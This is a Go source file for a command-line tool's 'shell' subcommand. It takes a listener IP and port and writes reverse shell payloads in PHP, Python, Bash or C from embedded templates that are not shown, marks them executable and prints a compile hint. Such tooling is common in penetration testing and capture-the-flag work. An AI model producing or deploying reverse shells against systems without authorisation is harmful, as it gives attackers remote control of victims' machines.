/*
Copyright © 2022 RON AMOSA <ron@cloudbuilder.io>
*/
package cmd

import (
	"embed"
	"fmt"
	"net"
	"os"
	"text/template"

	"github.com/spf13/cobra"
)

//go:embed templates/shells
var shellFS embed.FS

// shellCmd represents the shell command
var shellCmd = &cobra.Command{
	Use:   "shell <type>",
	Short: "create shells for use.",
	Long: `

	██████╗ ██╗  ██╗██╗  ██╗ █████╗  ██████╗██╗  ██╗
	██╔══██╗╚██╗██╔╝██║  ██║██╔══██╗██╔════╝██║ ██╔╝
	██████╔╝ ╚███╔╝ ███████║███████║██║     █████╔╝ 
	██╔══██╗ ██╔██╗ ██╔══██║██╔══██║██║     ██╔═██╗ 
	██║  ██║██╔╝ ██╗██║  ██║██║  ██║╚██████╗██║  ██╗
	╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝	
	`,
	Args: cobra.MinimumNArgs(1),
	Run: func(cmd *cobra.Command, args []string) {

		LHOST, _ := cmd.Flags().GetString("LHOST")
		LPORT, _ := cmd.Flags().GetString("LPORT")

		// parse the ip address
		addr := net.ParseIP(LHOST)

		// check if ip is valid
		if addr == nil {
			fmt.Println("Invalid address:", LHOST)
			os.Exit(1)
		}

		shell := args[0]

		switch {
		case shell == "php":
			createPhpSh(LHOST, LPORT)
		case shell == "py" || shell == "python":
			createPySh(LHOST, LPORT)
		case shell == "bash":
			createBashSh(LHOST, LPORT)
		case shell == "bin":
			createBinSh(LHOST, LPORT)
		default:
			fmt.Println("Did you select an available shell? Options: php, python/py, bash, bin")
		}
	},
}

func createPhpSh(ipaddress string, port string) (bool, error) {
	fmt.Printf("PHP shell for %v:%s\n", ipaddress, port)
	tmpl := template.Must(template.ParseFS(shellFS, "templates/shells/php/sh.tmpl"))

	// create output file
	file, err := os.Create("shell.php")

	// create target struct
	target := Target{
		Name:      "",
		IPAddress: ipaddress,
		Port:      port,
	}

	// check for errors
	if err != nil {
		fmt.Println(err)
		return false, nil
	} else {
		// create shell
		tmpl.Execute(file, target)
		fmt.Println("Created PHP shell at shell.php")
		return true, nil
	}
}

func createPySh(ipaddress string, port string) (bool, error) {
	fmt.Printf("Python shell for %v:%s\n", ipaddress, port)
	tmpl := template.Must(template.ParseFS(shellFS, "templates/shells/python/sh.tmpl"))

	// create output file
	file, err := os.Create("shell.py")

	// create target struct
	target := Target{
		Name:      "",
		IPAddress: ipaddress,
		Port:      port,
	}

	// check for errors
	if err != nil {
		fmt.Println(err)
		return false, nil
	} else {
		// create shell
		tmpl.Execute(file, target)
		fmt.Println("Created Python shell at shell.py")
		// Make the file executable
		os.Chmod("shell.py", 0755)
		return true, nil
	}
}

func createBashSh(ipaddress string, port string) (bool, error) {
	fmt.Printf("Bash shell for %v:%s\n", ipaddress, port)
	tmpl := template.Must(template.ParseFS(shellFS, "templates/shells/bash/sh.tmpl"))

	// create output file
	file, err := os.Create("shell.sh")

	// create target struct
	target := Target{
		Name:      "",
		IPAddress: ipaddress,
		Port:      port,
	}

	// check for errors
	if err != nil {
		fmt.Println(err)
		return false, nil
	} else {
		// create shell
		tmpl.Execute(file, target)
		fmt.Println("Created Bash shell at shell.sh")
		// Make the file executable
		os.Chmod("shell.sh", 0755)
		return true, nil
	}
}

func createBinSh(ipaddress string, port string) (bool, error) {
	fmt.Printf("Binary C shell for %v:%s\n", ipaddress, port)
	tmpl := template.Must(template.ParseFS(shellFS, "templates/shells/bin/sh.tmpl"))

	// create output file
	file, err := os.Create("revshell.c")

	// create target struct
	target := Target{
		Name:      "",
		IPAddress: ipaddress,
		Port:      port,
	}

	// check for errors
	if err != nil {
		fmt.Println(err)
		return false, nil
	} else {
		// create shell
		tmpl.Execute(file, target)
		fmt.Println("Created C source file at revshell.c")
		fmt.Println("Compile with: gcc -o revshell revshell.c")
		return true, nil
	}
}

func init() {
	createCmd.AddCommand(shellCmd)

	// Here you will define your flags and configuration settings.

	// Cobra supports Persistent Flags which will work for this command
	// and all subcommands, e.g.:
	shellCmd.PersistentFlags().String("LHOST", "", "ipaddress of the listening machine")
	shellCmd.PersistentFlags().String("LPORT", "", "port of the listening machine")

	// Cobra supports local flags which will only run when this command
	// is called directly, e.g.:
	//shellCmd.Flags().BoolP("toggle", "t", false, "Help message for toggle")
	shellCmd.MarkPersistentFlagRequired("LHOST")
	shellCmd.MarkPersistentFlagRequired("LPORT")
}
